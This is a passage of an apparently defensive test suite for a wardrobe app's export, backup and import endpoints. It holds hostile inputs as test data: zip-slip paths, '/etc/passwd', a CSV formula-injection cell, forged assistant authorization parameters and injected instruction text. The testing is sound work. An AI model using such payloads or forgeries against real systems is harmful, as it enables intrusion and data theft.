    // Those failed attempts did not spend the tickets. Each then works exactly once.
    const ok = await download(first.url);
    expect(ok.status).toBe(200);
    expect(ok.headers.get("cache-control")).toBe("no-store");
    expect(ok.headers.get("content-disposition")).toMatch(/^attachment/);
    expect(await sha256(new Uint8Array(await ok.arrayBuffer()))).toBe(victimPackage.job.sha256);
    for (const response of [await download(first.url), await download(first.url)]) {
      expect(response.status).toBe(410);
      expect((await response.arrayBuffer()).byteLength).toBeLessThan(1000);
    }
    // Two requests racing on one ticket: one download.
    const raced = await Promise.all([download(second.url), download(second.url), download(second.url)]);
    expect(raced.map((r) => r.status).sort()).toEqual([200, 410, 410]);
    for (const r of raced) await r.arrayBuffer();
    expect((await download(theirs.url)).status).toBe(200);
  });

  it("a ticket past its five minutes is refused (the stored expiry is moved into the past: the test cannot wait)", async () => {
    const ticket = await ticketFor(victim, victimPackage.job.exportId);
    const aged = await sql("UPDATE export_tickets SET expires_at = ? WHERE user_id = ? AND used_at IS NULL RETURNING ticket_hash", new Date(Date.now() - 1000).toISOString().replace(/\.\d{3}Z$/, "Z"), victim.userId);
    expect(aged.length).toBeGreaterThan(0);
    const response = await download(ticket.url);
    expect(response.status).toBe(410);
    expect(response.headers.get("content-type") ?? "").not.toMatch(/zip/);
  });

  it("[fixed D08-1] an export or backup download ticket is honoured on the app hostname only, never on the MCP hostname", async () => {
    const exportTicket = await ticketFor(victim, victimPackage.job.exportId);
    const backupTicket = await ticketFor(victim, victimBackup.backup.backupId);
    const viaMcp = await download(exportTicket.url, MCP_ORIGIN);
    const backupViaMcp = await download(backupTicket.url, MCP_ORIGIN);
    const outcome = { export: viaMcp.status, exportType: viaMcp.headers.get("content-type"), backup: backupViaMcp.status };
    await viaMcp.arrayBuffer();
    await backupViaMcp.arrayBuffer();
    // The MCP hostname serves the MCP transport and its OAuth endpoints; the owner's whole wardrobe is not downloadable there.
    expect(outcome.export, JSON.stringify(outcome)).not.toBe(200);
    expect(outcome.backup, JSON.stringify(outcome)).not.toBe(200);
  });

  it("no assistant token, stranger or cross-site page can request, read, download or import a package", async () => {
    const exportId = victimPackage.job.exportId as string;
    const calls: [string, string][] = [
      ["POST", "/v1/exports"],
      ["GET", "/v1/exports"],
      ["GET", `/v1/exports/${exportId}`],
      ["POST", `/v1/exports/${exportId}/ticket`],
      ["GET", "/v1/backups"],
      ["POST", "/v1/backups"],
      ["POST", `/v1/backups/${victimBackup.backup.backupId}/ticket`],
      ["GET", "/v1/backups/tombstones"],
      ["POST", "/v1/restore/verify"],
      ["POST", "/v1/imports"],
    ];
    const jobsBefore = (await sql("SELECT COUNT(*) AS n FROM export_jobs WHERE user_id = ?", victim.userId))[0]!.n;
    const ticketsBefore = (await sql("SELECT COUNT(*) AS n FROM export_tickets WHERE user_id = ?", victim.userId))[0]!.n;
    // The owner's own assistant token (an MCP credential is not an API credential), on either hostname.
    const token = victimMcp.oauth.snapshot().accessToken;
    for (const origin of [APP_ORIGIN, MCP_ORIGIN]) {
      for (const [method, path] of calls) {
        const zip = path === "/v1/imports";
        const response = await SELF.fetch(`${origin}${path}`, { method, headers: { Authorization: `Bearer ${token}`, "Cf-Access-Jwt-Assertion": token, "Content-Type": zip ? "application/zip" : "application/json" }, ...(method === "POST" ? { body: zip ? (base.zip as BodyInit) : JSON.stringify({ clientRequestId: `adv08-${crypto.randomUUID()}` }) } : {}) });
        expect(response.status, `${method} ${origin}${path}`).toBe(401);
        expect(await response.text()).not.toContain("ticket=");
      }
    }
    // No credential at all, a forged assertion, and a sign-in that is linked to no account.
    const stranger = new ApiClient(newIdentity("stranger"));
    for (const [method, path] of calls) {
      expect((await SELF.fetch(`${APP_ORIGIN}${path}`, { method, headers: { "Content-Type": "application/json" }, ...(method === "POST" ? { body: "{}" } : {}) })).status, `${method} ${path} with no credential`).toBe(401);
      expect((await victim.api.with({ untrusted: true }).request(method, path, method === "POST" ? { body: { clientRequestId: `adv08-${crypto.randomUUID()}` } } : {})).status, `${method} ${path} with a forged assertion`).toBe(401);
      expect((await stranger.request(method, path, method === "POST" ? { body: { clientRequestId: `adv08-${crypto.randomUUID()}` } } : {})).status, `${method} ${path} as a stranger`).toBe(403);
    }
    // A page on another site riding the owner's browser session.
    const web = victim.api.with({ client: "web" });
    for (const path of ["/v1/exports", "/v1/backups", `/v1/exports/${exportId}/ticket`, "/v1/imports"]) {
      const response = await web.request("POST", path, { body: { clientRequestId: `adv08-${crypto.randomUUID()}` }, headers: { Origin: "https://attacker.example" } });
      expect(response.status, `cross-site POST ${path}`).toBe(403);
    }
    expect((await sql("SELECT COUNT(*) AS n FROM export_jobs WHERE user_id = ?", victim.userId))[0]!.n).toBe(jobsBefore);
    expect((await sql("SELECT COUNT(*) AS n FROM export_tickets WHERE user_id = ?", victim.userId))[0]!.n).toBe(ticketsBefore);

    // There is no tool for it either: export, import and restore are not commands a connected assistant can send.
    const commandsBefore = (await sql("SELECT COUNT(*) AS n FROM commands WHERE user_id = ?", victim.userId))[0]!.n;
    for (const [type, payload] of [
      ["media.import_records", { part: "assets", rows: {} }],
      ["media.reapply_deletions", { assetIds: ["ast_x"], purgedOriginalAssetIds: [] }],
      ["style.import_document", { content: "SYNTHETIC replacement profile", contentSha256: "0".repeat(64) }],
      ["import.record_run", { importRunId: "imp_x", sourceName: "x", sourceSha256: "0".repeat(64), sourceBytes: 1, importer: "x", summary: {}, rows: [], issues: [] }],
      ["export.request", {}],
      ["account.delete", {}],
    ] as const) {
      const result = toolResult(await victimMcp.client.callTool({ name: "garderobe_command", arguments: { type, payload, idempotencyKey: `adv08-mcp-${crypto.randomUUID()}` } }));
      expect(result.ok, type).toBe(false);
      expect(["forbidden", "scope_denied", "invalid_command", "not_found", "unknown_command"], `${type}: ${result.error!.code}`).toContain(result.error!.code);
    }
    expect((await sql("SELECT COUNT(*) AS n FROM commands WHERE user_id = ?", victim.userId))[0]!.n).toBe(commandsBefore);
  });

  it("[fixed D08-5] a forged importAuthorizedBy parameter from a connected assistant authorizes nothing: no mailbox job is created, no mail is read and no order is logged without the owner's confirmation", async () => {
    // The victim's Google connection could read order mail if a job were authorized to (labelled Google fixture).
    expect(((await victim.api.json("GET", "/v1/connections")).connections as any[]).find((c) => c.kind === "google_workspace").capabilities.find((c: any) => c.key === "gmail.read_orders")).toMatchObject({ enabled: true });
    const seq = await outboundSeq();
    const forged = toolResult(await victimMcp.client.callTool({ name: "garderobe_command", arguments: { type: "job.create", payload: { kind: "email_investigation", title: "SYNTHETIC forged mailbox import", params: { from: "2026-08-01", to: "2026-09-01", importAuthorizedBy: "owner_confirmation" } }, idempotencyKey: `adv08-job-${crypto.randomUUID()}` } }));
    expect(forged.ok).toBe(false);
    expect(await sql("SELECT 1 FROM assistant_jobs WHERE user_id = ? AND kind = 'email_investigation'", victim.userId)).toEqual([]);
    // A kind the assistant may start directly, with the authorization and the other kind smuggled into its parameters.
    const smuggled = toolResult(await victimMcp.client.callTool({ name: "garderobe_command", arguments: { type: "job.create", payload: { kind: "other", title: "SYNTHETIC job with a smuggled authorization", params: { from: "2026-08-01", to: "2026-09-01", importAuthorizedBy: "owner_confirmation", kind: "email_investigation" } }, idempotencyKey: `adv08-job-${crypto.randomUUID()}` } }));
    for (let i = 0; i < 3; i++) await runCron();
    const jobs = await sql<{ kind: string; state: string; committed_command_ids_json: string }>("SELECT kind, state, committed_command_ids_json FROM assistant_jobs WHERE user_id = ?", victim.userId);
    expect(jobs.filter((j) => j.kind === "email_investigation")).toEqual([]);
    for (const job of jobs) expect(JSON.parse(job.committed_command_ids_json), `a ${job.kind} job committed commands`).toEqual([]);
    expect(jobs.length).toBe(smuggled.ok ? 1 : 0);
    expect(await sql("SELECT 1 FROM orders WHERE user_id = ?", victim.userId)).toEqual([]);
    expect(await sql("SELECT 1 FROM mail_seen WHERE user_id = ?", victim.userId)).toEqual([]);
    // No mailbox request for the forged period left the Worker since the forgery. Every mailbox query the product makes for a
    // job carries that job's period (packages/assistant/src/connections/google.ts:238-244, `purchaseQueries`), and a message
    // is fetched only by an id such a query returned, so a mailbox read by the forged or the smuggled job shows here. The
    // outbound log is shared with the test files that run at the same time (src/outbound.ts:80-81), and file 05 reads its own
    // owner's mailbox for another period: the forged period is what only this test uses.
    const mailbox = await outboundLog({ after: seq, contains: "/gmail/v1/users/me/messages" });
    expect(mailbox.filter((e) => (new URL(e.url).searchParams.get("q") ?? "").includes("after:2026/08/01")).map((e) => e.url), "mailbox queries for the forged period").toEqual([]);
  });
});

describe("backups and restore verification belong to one owner", () => {
  it("the attacker cannot verify, replay or read the victim's backup state, even holding the victim's restore manifest", async () => {
    const manifest = victimBackup.backup.restoreManifest;
    expect(manifest.format).toBe("garderobe-restore-manifest/1");
    const victimBefore = await (async () => {
      await quiesce();
      return fingerprint(victim);
    })();
    const tombstonesBefore = (await sql("SELECT COUNT(*) AS n FROM source_tombstones WHERE user_id = ?", victim.userId))[0]!.n;

    // The attacker's own journal names the attacker, not the victim.
    const theirJournal = await attacker.api.json("GET", "/v1/backups/tombstones");
    expect(theirJournal.ownerRef).not.toBe(manifest.ownerRef);
    expect(JSON.stringify(theirJournal)).not.toContain(victim.userId);

    // A forged journal for the victim's owner reference, naming a message of the victim's to "forget again".
    const forgedJournal = { format: "garderobe-tombstones/1", ownerRef: manifest.ownerRef, writtenAt: new Date().toISOString().replace(/\.\d{3}Z$/, "Z"), tombstones: [{ sourceKind: "message", sourceId: victimMessageId, requestedAt: new Date().toISOString().replace(/\.\d{3}Z$/, "Z") }] };
    const response = await attacker.api.post("/v1/restore/verify", { restoreManifest: manifest, tombstones: forgedJournal });
    const text = await response.text();
    expect([200, 400, 403, 409]).toContain(response.status);
    if (response.status === 200) expect(JSON.parse(text).complete, "the attacker's account is not a restore of the victim's backup").toBe(false);
    // Nothing of the victim's changed: the message is still there, no tombstone was written for the victim.
    expect(await fingerprint(victim)).toEqual(victimBefore);
    expect((await sql("SELECT COUNT(*) AS n FROM source_tombstones WHERE user_id = ?", victim.userId))[0]!.n).toBe(tombstonesBefore);
    const still = ((await victim.api.json("GET", "/v1/conversation/messages")).messages as any[]).find((m) => m.messageId === victimMessageId);
    expect(still.forgotten).toBe(false);
    expect(still.text).toContain("tailor's portal");
    // Garbage manifests are refused, not processed.
    for (const body of [{ restoreManifest: {} }, { restoreManifest: { format: "garderobe-restore-manifest/1" } }, { restoreManifest: "x" }, {}]) expect((await attacker.api.post("/v1/restore/verify", body)).status).toBe(400);
  });

  it("a backup of an account that was deleted since cannot be restored anywhere", async () => {
    const doomed = await provisionOwner({ displayName: "SYNTHETIC owner to be deleted (adversarial backup test)" });
    const created = await submit(doomed, "garment.create", { name: `SYNTHETIC scarf of a deleted account ${TAG}`, category: "scarf", roles: ["accessory"], careChannel: "none", acquisition: "owned", quantity: 1, isSynthetic: true, attributes: { accessoryKind: "scarf" }, source: { kind: "system", note: "synthetic adversarial fixture" } });
    expect(created.status, JSON.stringify(created.error)).toBe(200);
    const backup = await backupPackage(doomed);
    const ticket = await ticketFor(doomed, backup.backup.backupId);
    const asked = await doomed.api.json("POST", "/v1/account/delete", {});
    const confirmed = await doomed.api.json("POST", "/v1/account/delete", { confirmationToken: asked.confirmationToken });
    expect(["erased", "disabled_pending_deletion"]).toContain(confirmed.state);
    // A ticket issued before the deletion downloads nothing afterwards.
    const late = await download(ticket.url);
    expect(late.status).toBeGreaterThanOrEqual(400);
    expect(late.headers.get("content-type") ?? "").not.toMatch(/zip/);
    // The copy the owner (or a thief) kept is refused as a restore.
    const target = await freshTarget("backup of a deleted account");
    const before = await ownerRows(target);
    const response = await importInto(target, backup.zip);
    expect(response.status).toBe(403);
    expect((await errorOf(response)).details.reason).toBe("owner_erased");
    expect(await ownerRows(target)).toEqual(before);
    expect((await inventory(target)).total).toBe(0);
  });
});

/* ================================================================== */
/* Imports                                                              */
/* ================================================================== */

/** One refused attempt against an empty account, which must stay exactly as it was. Accounts are rotated under the hourly limit. */
let pool: { owner: TestOwner; used: number; baseline: Record<string, number> } | null = null;
async function attempt(body: Uint8Array | string, headers?: Record<string, string>): Promise<{ response: Response; untouched: () => Promise<void> }> {
  if (!pool || pool.used >= 5) {
    const owner = await freshTarget("refused packages");
    pool = { owner, used: 0, baseline: await ownerRows(owner) };
  }
  const current = pool;
  current.used++;
  const response = await importInto(current.owner, body, headers);
  return { response, untouched: async () => expect(await ownerRows(current.owner), "rows of the account after the refused import").toEqual(current.baseline) };
}
async function refusedWhole(body: Uint8Array | string, what: string, headers?: Record<string, string>): Promise<void> {
  const { response, untouched } = await attempt(body, headers);
  await expectRejected(response, what);
  await untouched();
}

/** Every stored image of an owner is the bytes its record names (so nothing else was stored as an image). */
async function expectMediaIntact(owner: TestOwner): Promise<number> {
  const rows = await sql<{ rendition_id: string; object_key: string; sha256: string; status: string }>("SELECT rendition_id, object_key, sha256, status FROM media_renditions WHERE user_id = ?", owner.userId);
  for (const row of rows) {
    expect(row.object_key.startsWith(`u/${owner.userId}/`), `${row.rendition_id} is stored under its owner`).toBe(true);
    expect(row.object_key).not.toContain("..");
    const object = await bindings().MEDIA_BUCKET!.get(row.object_key);
    if (object) expect(await sha256(new Uint8Array(await object.arrayBuffer())), `${row.rendition_id} bytes`).toBe(row.sha256);
    // An active, serveable rendition must have its bytes; only a rendition that is no longer served may lack them.
    else expect(["deleted", "rejected", "superseded"], `${row.rendition_id} (${row.status}) has no stored object`).toContain(row.status);
  }
  const keys = await mediaKeys(`u/${owner.userId}/`);
  const known = new Set(rows.map((r) => r.object_key));
  for (const key of keys) expect(known.has(key) || key.includes("/staging/") || key.includes("/composites/"), `unrecorded object ${key.replace(owner.userId, "<owner>")}`).toBe(true);
  return rows.length;
}

/** The image type the bytes themselves say they are (JPEG FF D8 FF, PNG 89 50 4E 47 0D 0A 1A 0A, WebP RIFF....WEBP), or null. */
function imageSignature(bytes: Uint8Array): "image/jpeg" | "image/png" | "image/webp" | null {
  const at = (offset: number, signature: number[]): boolean => bytes.length >= offset + signature.length && signature.every((b, i) => bytes[offset + i] === b);
  if (at(0, [0xff, 0xd8, 0xff])) return "image/jpeg";
  if (at(0, [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])) return "image/png";
  if (at(0, [0x52, 0x49, 0x46, 0x46]) && at(8, [0x57, 0x45, 0x42, 0x50])) return "image/webp";
  return null;
}

describe("imports: the honest package, and who it is written for", () => {
  let target: TestOwner;
  let report: any;

  it("imports into an empty account with the same identifiers; hostile cells and instruction text arrive as inert data", async () => {
    target = await freshTarget("honest package");
    const attackerBefore = await ownerSnapshot(attacker);
    const response = await importInto(target, base.zip);
    report = await response.json();
    expect(response.status, JSON.stringify(report).slice(0, 300)).toBe(200);
    expect(report).toMatchObject({ state: "completed", checksumsVerified: true, idsPreserved: true, externalEffectsReplayed: 0, error: null });

    const source = await inventory(attacker);
    const restored = await inventory(target);
    expect(restored.total).toBe(source.total);
    expect(restored.items.map((i) => i.garment.garmentId).sort()).toEqual(source.items.map((i) => i.garment.garmentId).sort());
    expect(restored.items.map((i) => i.garment.name)).toEqual(expect.arrayContaining(FORMULAS));
    // Instruction text in names and notes did nothing: no garment was invented, no command ran, nothing waits for a decision.
    expect(restored.items.some((i) => /Injected Phantom Jacket/i.test(i.garment.name))).toBe(false);
    const packaged = new Set<string>(base.json("records/receipts.json").tables.commands.rows.map((c: any) => c.command_id));
    const stored = await sql<{ command_id: string; type: string; actor: string }>("SELECT command_id, type, actor FROM commands WHERE user_id = ?", target.userId);
    expect(stored.filter((c) => packaged.has(c.command_id)).length).toBe(packaged.size);
    // The only commands beyond the package's own receipts are the import's own records of restoring the images.
    expect([...new Set(stored.filter((c) => !packaged.has(c.command_id)).map((c) => c.type))]).toEqual(["media.import_records"]);
    expect((await target.api.json("GET", "/v1/proposals?state=all")).proposals).toEqual([]);
    // The restriction came across as it was: active.
    expect(await sql("SELECT status FROM restrictions WHERE user_id = ? AND restriction_id = ?", target.userId, restrictionId)).toEqual([{ status: "active" }]);
    // No sign-in, grant, connection or credential came with the package.
    expect((await target.api.json("GET", "/v1/me")).identities).toHaveLength(1);
    expect((await target.api.json("GET", "/v1/assistants")).grants).toEqual([]);
    expect((await target.api.json("GET", "/v1/connections")).connections).toEqual([]);
    expect(report.components.find((c: any) => c.name === "account").imported).toBe(0);
    // Images were restored into the target's own private prefix, byte for byte.
    expect(await expectMediaIntact(target)).toBeGreaterThan(0);
    // The source account is exactly as it was.
    expect(await ownerSnapshot(attacker)).toEqual(attackerBefore);

    // What the target exports in turn is neutralised as well.
    const again = await exportPackage(target);
    expect(liveFormulaCells(again)).toEqual([]);
    expect(found(again.allText(), { "source sign-in": attacker.identity.subject, "source sign-in email": attacker.identity.email ?? "" })).toEqual([]);
  });

  it("the import job is readable by the account that ran it and by no one else", async () => {
    expect((await target.api.json("GET", `/v1/imports/${report.importId}`)).state).toBe("completed");
    expect(await target.api.json("GET", `/v1/runs/${report.runId}`)).toMatchObject({ kind: "import", state: "completed" });
    for (const other of [attacker, victim]) {
      expect((await other.api.get(`/v1/imports/${report.importId}`)).status).toBe(404);
      expect((await other.api.get(`/v1/runs/${report.runId}`)).status).toBe(404);
    }
  });

  it("a non-empty account is never overwritten: the real owner, the source owner and an account that already imported all refuse", async () => {
    for (const [what, owner, zip] of [["the real owner", victim, base.zip], ["the source owner", attacker, base.zip], ["an account that already imported", target, base.zip], ["the real owner with their own package", victim, victimPackage.zip]] as const) {
      const before = await settledRows(owner);
      const print = await fingerprint(owner);
      const response = await importInto(owner, zip);
      expect(response.status, what).toBe(409);
      expect((await errorOf(response)).code, what).toBe("precondition_failed");
      expect(await ownerRows(owner), what).toEqual(before);
      expect(await fingerprint(owner), what).toEqual(print);
    }
    expect((await inventory(victim)).items.some((i) => FORMULAS.includes(i.garment.name))).toBe(false);
  });

  it("a package exported by another owner is written for the caller only, whatever owner its rows name", async () => {
    // The real owner's package, with the victim's user ID written into rows as an extra column, imported by an account the attacker controls.
    let files = withJson(victimPackage.files, "records/inventory.json", (inv) => {
      for (const table of Object.values(inv.tables) as any[]) {
        table.columns = [...table.columns, "user_id"];
        for (const row of table.rows) row.user_id = victim.userId;
      }
    });
    files = withJson(files, "records/assistant.json", (records) => {
      for (const rows of Object.values(records.tables) as any[][]) for (const row of rows) row.user_id = victim.userId;
    });
    const zip = await repack(files);
    const taker = await freshTarget("another owner's package");
    const victimRows = await settledSnapshot(victim);
    const victimPrint = await fingerprint(victim);
    const response = await importInto(taker, zip);
    const body = (await response.json()) as any;
    expect(response.status, JSON.stringify(body).slice(0, 300)).toBe(200);
    expect(body.state).toBe("completed");
    // The victim's account: not one row more, less or different.
    expect(await ownerSnapshot(victim)).toEqual(victimRows);
    expect(await fingerprint(victim)).toEqual(victimPrint);
    // The copy lives under the caller, with the caller's own sign-in and nothing that opens the victim's account.
    expect((await inventory(taker)).total).toBe((await inventory(victim)).total);
    expect((await taker.api.json("GET", "/v1/me")).userId).toBe(taker.userId);
    expect((await taker.api.json("GET", "/v1/me")).identities).toHaveLength(1);
    expect(await sql("SELECT 1 FROM mcp_grants WHERE user_id = ?", taker.userId)).toEqual([]);
    expect(await sql("SELECT 1 FROM connection_credentials WHERE user_id = ?", taker.userId)).toEqual([]);
    expect(await sql("SELECT 1 FROM connection_profiles WHERE user_id = ? AND state = 'connected'", taker.userId)).toEqual([]);
    expect((await taker.api.json("GET", "/v1/connections")).connections.filter((c: any) => c.state === "connected")).toEqual([]);
    expect((await taker.api.json("GET", "/v1/devices")).devices).toEqual([]);
    // The victim's assistant still reads the victim's wardrobe only; the victim's session still opens the victim's account only.
    // The import keeps the package's garment IDs, so the caller's copy has the same IDs as the victim's garments by design: a
    // garment that exists only in the caller's account is what tells the two wardrobes apart.
    const takerOnly = await submit(taker, "garment.create", {
      name: `SYNTHETIC taker-only garment ${TAG}`,
      category: "scarf",
      roles: ["accessory"],
      careChannel: "none",
      acquisition: "owned",
      quantity: 1,
      isSynthetic: true,
      attributes: { accessoryKind: "scarf" },
      source: { kind: "system", note: "synthetic adversarial fixture" },
    });
    expect(takerOnly.status, JSON.stringify(takerOnly.error)).toBe(200);
    const takerOnlyId = takerOnly.receipt.result.garmentId as string;
    const victimIds = (await inventory(victim)).items.map((i) => i.garment.garmentId).sort();
    const viaAssistant = toolResult(await victimMcp.client.callTool({ name: "garderobe_inventory", arguments: { view: "snapshot" } }));
    expect(viaAssistant.ok, JSON.stringify(viaAssistant.error)).toBe(true);
    expect(viaAssistant.data.complete, "the snapshot is the whole wardrobe").toBe(true);
    const assistantIds = (viaAssistant.data.data.items as { garment: { garmentId: string } }[]).map((i) => i.garment.garmentId).sort();
    expect(assistantIds, "the victim's assistant reads exactly the victim's garments").toEqual(victimIds);
    expect(viaAssistant.data.total).toBe(victimIds.length);
    expect(assistantIds, "a garment of the importing account").not.toContain(takerOnlyId);
    for (const id of formulaGarmentIds) expect(assistantIds, "a garment of the synthetic owner").not.toContain(id);
    expect(JSON.stringify(viaAssistant.data), "the importing account's identifier").not.toContain(taker.userId);
    expect((await victim.api.json("GET", "/v1/me")).userId).toBe(victim.userId);
    await expectMediaIntact(taker);
  });
});

describe("imports: a package that was changed, or is not a package, is refused whole", () => {
  it("a changed file under the old checksum, a changed manifest, a missing file, an extra file", async () => {
    const renamed = withJson(base.files, "records/inventory.json", (inv) => (inv.tables.garments.rows[0].name = "SYNTHETIC garment that was never in the export"));
    await refusedWhole(zipSync(renamed), "a changed file with the old manifest and checksums");
    await refusedWhole(await repack(renamed, { keepChecksums: true }), "a changed file, manifest updated, checksum list stale");
    await refusedWhole(await repack(renamed, { keepManifestFiles: true }), "a changed file, checksum list updated, manifest stale");
    await refusedWhole(await repack(base.files, { keepChecksums: true, manifest: (m) => (m.exportId = "exp_forged0000000") }), "a changed manifest under the old checksum list");
    await refusedWhole(await repack(base.files, { manifest: (m) => (m.files[0].sha256 = "0".repeat(64)) }), "a manifest naming a wrong checksum");
    await refusedWhole(await repack(base.files, { manifest: (m) => (m.files[0].bytes += 1) }), "a manifest naming a wrong size");

    const { ["records/style.json"]: _dropped, ...withoutStyle } = base.files;
    await refusedWhole(zipSync(withoutStyle), "a missing file that the manifest lists");
    await refusedWhole(await repack(withoutStyle, { keepManifestFiles: true }), "a missing file with the checksum list updated");
    await refusedWhole(zipSync({ ...base.files, "records/extra.json": encoder.encode('{"tables":{}}') }), "an extra file the manifest does not list");
    await refusedWhole(zipSync({ ...base.files, "views/evil.csv": encoder.encode("=cmd|' /C calc'!A0\r\n") }), "an extra view");
    await refusedWhole(await repack({ ...base.files, "records/extra.json": encoder.encode('{"tables":{}}') }, { keepManifestFiles: true }), "an extra file in the checksum list but not in the manifest");

    const { ["checksums.sha256"]: _sums, ...withoutSums } = base.files;
    await refusedWhole(zipSync(withoutSums), "no checksum list");
    const { ["manifest.json"]: _manifest, ...withoutManifest } = base.files;
    await refusedWhole(zipSync(withoutManifest), "no manifest");
    await refusedWhole(await repack(base.files, { manifest: (m) => (m.format = "garderobe-export/999") }), "an unknown format version");
    await refusedWhole(await repack(base.files, { manifest: (m) => delete m.files }), "a manifest without a file list");
    await refusedWhole(zipSync({ ...base.files, "manifest.json": encoder.encode("{not json") }), "a manifest that is not JSON");
    await refusedWhole(zipSync({ ...base.files, "checksums.sha256": encoder.encode("deadbeef  manifest.json\n") }), "a malformed checksum list");
  });

  it("paths that leave the package: zip-slip names, absolute paths, and a manifest pointing outside", async () => {
    const payload = encoder.encode('{"tables":{}}');
    for (const name of ["../evil.json", "records/../../evil.json", "/etc/passwd", "/records/inventory.json", "records\\..\\evil.json", "./records/evil.json", "records//evil.json", "records/./evil.json", ".."]) {
      // Listed consistently in the manifest and checksum list, so only the path itself can be the reason for refusal.
      await refusedWhole(await repack({ ...base.files, [name]: payload }), `an entry named ${JSON.stringify(name)}`);
    }
    // The manifest names a path outside the package for a file that is inside it.
    for (const path of ["../records/inventory.json", "/records/inventory.json", "records/../records/inventory.json", "file:///etc/passwd"]) {
      await refusedWhole(await repack(base.files, { keepChecksums: false, manifest: (m) => (m.files.find((f: any) => f.path === "records/inventory.json").path = path) }), `a manifest path ${JSON.stringify(path)}`);
    }
    // The checksum list names a path outside the package.
    const sums = base.text("checksums.sha256").replace("  records/inventory.json", "  ../records/inventory.json");
    await refusedWhole(zipSync({ ...base.files, "checksums.sha256": encoder.encode(sums) }), "a checksum line for a path outside the package");
  });

  it("a truncated archive, bytes that are not an archive, and the wrong content type", async () => {
    const zip = base.zip;
    await refusedWhole(zip.subarray(0, Math.floor(zip.length / 2)), "half an archive");
    await refusedWhole(zip.subarray(0, zip.length - 30), "an archive without its end record");
    await refusedWhole(zip.subarray(100), "an archive without its beginning");
    await refusedWhole(encoder.encode("this is not a wardrobe package".padEnd(400, ".")), "plain text");
    await refusedWhole(testPng(), "a PNG");
    await refusedWhole(encoder.encode(JSON.stringify({ manifest: base.manifest })), "the manifest as JSON");
    await refusedWhole(new Uint8Array([0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3, ...new Uint8Array(64)]), "a gzip header");
    await refusedWhole(new Uint8Array([0x50, 0x4b, 0x05, 0x06, ...new Uint8Array(18)]), "an empty archive");
    const corrupted = zip.slice();
    for (let i = 60; i < 200; i++) corrupted[i]! ^= 0xa5;
    await refusedWhole(corrupted, "an archive with its first entry corrupted");

    // The right bytes under the wrong label are not read at all.
    for (const type of ["text/plain", "application/json", "multipart/form-data; boundary=x", "application/x-www-form-urlencoded", "image/png", "application/zipx", ""]) {
      const { response, untouched } = await attempt(zip, type ? { "Content-Type": type } : { "Content-Type": "" });
      expect([400, 415], `content type ${JSON.stringify(type)} -> ${response.status}`).toContain(response.status);
      await response.text();
      await untouched();
    }
    const { response: empty, untouched } = await attempt(new Uint8Array(0));
    expect(empty.status).toBe(400);
    await untouched();
  });

  it("two entries with one name: what is imported is never content that failed its checksum", async () => {
    const hostile = encoder.encode(JSON.stringify((() => {
      const inv = base.json("records/inventory.json");
      inv.tables.garments.rows[0].name = "SYNTHETIC hostile twin of a garment";
      return inv;
    })()));
    const entries = Object.entries(base.files);
    const at = entries.findIndex(([name]) => name === "records/inventory.json");
    // The verified copy first, the hostile copy last (a reader that keeps the last entry would import the hostile one).
    const lastWins = zipEntries([...entries.slice(0, at + 1), ["records/inventory.json", hostile], ...entries.slice(at + 1)]);
    // The hostile copy first, the verified copy last.
    const firstWins = zipEntries([...entries.slice(0, at), ["records/inventory.json", hostile], ...entries.slice(at)]);
    for (const [what, zip] of [["hostile copy last", lastWins], ["hostile copy first", firstWins]] as const) {
      const target = await freshTarget(`duplicate entry, ${what}`);
      const before = await ownerRows(target, { ignore: ATTEMPT_RECORDS });
      const response = await importInto(target, zip);
      const text = await response.text();
      if (response.status === 200 && JSON.parse(text).state === "completed") {
        const names = (await inventory(target)).items.map((i) => i.garment.name);
        expect(names, what).not.toContain("SYNTHETIC hostile twin of a garment");
      } else {
        expect([200, 400], what).toContain(response.status);
        expect(await ownerRows(target, { ignore: ATTEMPT_RECORDS }), what).toEqual(before);
      }
    }
  });

  it("more attempts than the hourly limit are turned away before the package is read", async () => {
    const target = await freshTarget("rate limit");
    const before = await ownerRows(target);
    const statuses: number[] = [];
    for (let i = 0; i < 6; i++) statuses.push((await importInto(target, encoder.encode(`not a package ${i}`.padEnd(64, ".")))).status);
    expect(statuses).toEqual([400, 400, 400, 400, 400, 400]);
    const limited = await importInto(target, base.zip); // a perfectly good package: the limit is on attempts
    expect(limited.status).toBe(429);
    expect(Number(limited.headers.get("Retry-After"))).toBeGreaterThan(0);
    expect(await ownerRows(target)).toEqual(before);
    expect((await inventory(target)).total).toBe(0);
  });
});

describe("imports: what a well-formed hostile package (manifest and checksums recomputed) still cannot do", () => {
  it("planted sign-ins, sessions, recovery credentials, assistant grants, connection credentials and decided proposals are not imported", async () => {
    // A LABELLED SYNTHETIC account of the attacker's whose own credential rows are copied into the package.
    const donor = await provisionOwner({ displayName: "SYNTHETIC donor of planted credentials (adversarial import test)" });
    await seedSynthetic(donor, SYNTHETIC_WARDROBE.slice(0, 2));
    const donorMcp = await connectMcp(donor, { write: true, clientName: "Donor's assistant (synthetic owner)" });
    const planted = newIdentity("planted-sign-in");
    const tables: Record<string, any> = {
      // The donor's sign-in row with a subject the attacker controls: if imported, it would open the target account.
      auth_identities: await dumpOf("auth_identities", donor.userId, (row) => Object.assign(row, { subject: planted.subject, display_email: planted.email })),
      // The donor's recovery verifier: if imported, the donor's recovery kit would recover the target account.
      recovery_credentials: await dumpOf("recovery_credentials", donor.userId, (row) => (row.kit_id = `kit_planted_${TAG}`)),
      // The donor's active assistant grant: if imported, the donor's connected assistant would be granted the target.
      mcp_grants: await dumpOf("mcp_grants", donor.userId),
      auth_session_floors: await dumpOf("auth_session_floors", attacker.userId),
      connection_credentials: await dumpOf("connection_credentials", victim.userId),
      connection_profiles: await dumpOf("connection_profiles", victim.userId),
      connection_oauth_states: await dumpOf("connection_oauth_states", victim.userId),
      notification_devices: await dumpOf("notification_devices", victim.userId),
      owner_invitations: await dumpOf("owner_invitations", attacker.userId),
      identity_link_tickets: await dumpOf("identity_link_tickets", attacker.userId),
      export_tickets: await dumpOf("export_tickets", attacker.userId),
      account_deletions: await dumpOf("account_deletions", attacker.userId),
      proposal_decisions: await dumpOf("proposal_decisions", attacker.userId),
      submitted_proposals: await dumpOf("submitted_proposals", attacker.userId),
      users: await dumpOf("users", attacker.userId, (row) => Object.assign(row, { display_name: "SYNTHETIC planted display name", status: "active", is_synthetic: 0 })),
      outbox: await dumpOf("outbox", attacker.userId),
      command_preconditions: await dumpOf("command_preconditions", attacker.userId),
    };
    let files = { ...base.files };
    // Planted under every ledger component, in the account file, and as a component of its own.
